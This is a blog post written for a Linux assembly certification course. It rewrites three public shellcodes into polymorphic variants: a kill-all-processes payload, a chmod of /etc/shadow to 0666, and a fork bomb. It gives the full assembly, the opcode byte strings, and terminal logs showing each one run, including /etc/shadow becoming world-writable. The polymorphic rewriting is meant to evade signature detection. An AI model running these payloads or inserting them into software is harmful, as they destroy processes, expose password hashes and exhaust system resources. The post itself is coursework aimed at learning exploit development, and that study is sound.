---
layout: post
title: "SLAE Assignment #6 | Polymorphic shellcode"
date: 2018-01-26
comments: true
categories:
---

Assignment #6 in the [SLAE](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) exam is to create polymorphic versions of 3 shellcodes from shell-storm.

## First one...

is [killing all processes](http://shell-storm.org/shellcode/files/shellcode-564.php):

```
; linux/x86 kill all processes 9 bytes
; root@thegibson
; 2010-01-14
 
section .text
        global _start
 
_start:
        ; kill(-1, SIGKILL);
        mov al, 37
        push byte -1
        pop ebx
        mov cl, 9
        int 0x80
```

I rewrote it as follows:
```
; linux/x86 kill all processes 9 bytes
; polymorphic variant, original version made byroot@thegibson
; 2010-01-14
 
section .text
        global _start
 
_start:
        ; kill(-1, SIGKILL);
        
        mov cl, 9

        ;mov al, 37
        mov al, 74
        shr al, 1

        ;push byte -1
        ;pop ebx
        sub ebx, ebx
        sub ebx, 1

        int 0x80
```

As can be seen, the `mov al, 37` instruction were replaced with a mov and and a shift right, to divide the value.

Then, the `push -1` sequence we're replaced with `sub ebx, ebx` to zero out the register, and then `sub ebx, 1` to get -1.

To finish it off, the `mov cl, 9` instruction were moved to the top.

The size has gone from 9 to 13 bytes, so a 44% increase.

```
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-6$ ../tools/shellcode.sh poly_1
\xb1\x09\xb0\x4a\xd0\xe8\x29\xdb\x83\xeb\x01\xcd\x80
```

Running it results in that all programs that the user has right to kill becomes killed.

```
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-6$ ../tools/runShellcode.py '\xb1\x09\xb0\x4a\xd0\xe8\x29\xdb\x83\xeb\x01\xcd\x80'
Connection to 172.16.143.141 closed by remote host.
Connection to 172.16.143.141 closed.
```

## Second one...

is [chmod(/etc/shadow, 0666)](http://shell-storm.org/shellcode/files/shellcode-556.php).

Original code:

```
section .text
        global _start
 
_start:
  xor eax, eax

  push eax
  push dword 0x776f6461
  push dword 0x68732f2f
  push dword 0x6374652f

  mov ebx,esp
  push word 0x1b6
  pop ecx
  mov al,0xf
  int 0x80

  mov al,0x1
  int 0x80
```

Polymorphed:
```
ssection .text
        global _start

_start:
  ;xor eax, eax
  sub eax, eax

  push eax

  ;push dword 0x776f6461
  mov dword [esp-4], 0x776f6461

  ;push dword 0x68732f2f
  mov dword [esp-8], 0x68732f2f

  ;push dword 0x6374652f
  mov dword [esp-12], 0x6374652f

  sub esp, 12

  mov ebx,esp

  ;push word 0x1b6
  ;pop ecx
  push word 0x1b60
  pop ecx
  shr ecx, 4

  mov al,0xf
  int 0x80

  mov al,0x1
  int 0x80
```

Changes:
* `xor eax, eax` replaced with `sub eax, eax`
* The string are added to the stack through `mov` instruction and not `push`
* The file-right `0x1b6` is hidden and restored with shift instructions

The size has increased from 33 to 48 bytes (45 %).

Running it:
```
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-6$ ../tools/compile.sh poly_2                              
Done
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-6$ ../tools/format_shellcode.py poly_2                     
Python style shellcode:
\x29\xc0\x50\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x10\x89\xe3\x66\x68\x60\x1b\x59\xc1\xe9\x04\xb0\x0f\xcd\x80\xb0\x01\xcd\x80

NASM stylish:
0x29,0xc0,0x50,0xc7,0x44,0x24,0xfc,0x61,0x64,0x6f,0x77,0xc7,0x44,0x24,0xf8,0x2f,0x2f,0x73,0x68,0xc7,0x44,0x24,0xf4,0x2f,0x65,0x74,0x63,0x83,0xec,0x10,0x89,0xe3,0x66,0x68,0x60,0x1b,0x59,0xc1,0xe9,0x04,0xb0
,0x0f,0xcd,0x80,0xb0,0x01,0xcd,0x80
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-6$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1130 Jan 25 14:03 /etc/shadow
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-6$ sudo su root

root@osboxes:/mnt/hgfs/SLAE/assignment-6# ../tools/runShellcode.py '\x29\xc0\x50\xc7\x44\x24\xfc\x61\x64\x6f\x77\xc7\x44\x24\xf8\x2f\x2f\x73\x68\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x10\x89\xe3\x66\x68
\x60\x1b\x59\xc1\xe9\x04\xb0\x0f\xcd\x80\xb0\x01\xcd\x80'
root@osboxes:/mnt/hgfs/SLAE/assignment-6# ls -l /etc/shadow
-rw-rw-rw- 1 root shadow 1130 Jan 25 14:03 /etc/shadow
```

## Third one...

is the [forkbomb](http://shell-storm.org/shellcode/files/shellcode-214.php).

Original code:
```
section .text

  global _start

_start:
  push byte 2
  pop eax
  int 0x80
  jmp short _start
```

Polymorphed variant:
```
section .text:
  global _start

_start:
  ;push byte 2
  ;pop eax 
  xor eax, eax
  inc eax
  inc eax
  int 0x80
  jmp short _start
```

Changes:
* Set the value of eax with other instructions

The size has gone from 7 to 8 bytes in size (14 % increase).

Running it results in a fork bomb.
```
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-6$ ../tools/compile.sh poly_3
Done
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-6$ ../tools/format_shellcode.py poly_3                     
Python style shellcode:
"\x31\xc0\x40\x40\xcd\x80\xeb\xf8"

NASM stylish:
0x31,0xc0,0x40,0x40,0xcd,0x80,0xeb,0xf8
tomasuh@osboxes:/mnt/hgfs/SLAE/assignment-6$ ../tools/runShellcode.py "\x31\xc0\x40\x40\xcd\x80\xeb\xf8"
```


---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 569

